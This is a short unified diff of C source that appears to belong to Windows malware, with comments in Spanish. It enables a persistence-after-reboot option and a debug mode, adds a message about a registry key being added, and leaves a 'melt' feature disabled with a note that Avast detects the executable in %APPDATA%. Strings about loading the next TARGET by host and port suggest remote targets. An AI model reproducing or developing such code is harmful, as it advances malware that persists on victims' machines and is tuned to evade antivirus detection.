@@ -20,14 +20,14 @@
 **    Incluye código para la persistencia tras reinicio
 *###############################################################################*/
 #define AUTOSTART
-#undef AUTOSTART
+//#undef AUTOSTART
 
 /*###############################################################################
 ** DEBUG:
 **    Incluye código para mostrar mensajes por consola
 *###############################################################################*/
 #define DEBUG
-#undef DEBUG
+//#undef DEBUG
 
 #ifdef DEBUG
 DEFINE_PYSRC(
@@ -64,6 +64,7 @@ const char* sADDR       = {" (0x%08X)... "};
 const char* sOK         = {"OK\n"};
 const char* sERR        = {"Error\n"};
 const char* sTARGET     = {"[S]Cargando siguiente TARGET(%s:%d)...\n"};
+const char* sREG        = {"[S]Clave del registro agregada\n"};
 #endif
 
 /*###############################################################################
@@ -75,7 +76,7 @@ const char* sTARGET     = {"[S]Cargando siguiente TARGET(%s:%d)...\n"};
 **    }
 *###############################################################################*/
 #define MELT
-#undef MELT
+#undef MELT //TODO(Avast detecta el ejecutable cuando esta en %APPDATA%)
 
 /*###############################################################################
 ** Error_Check:
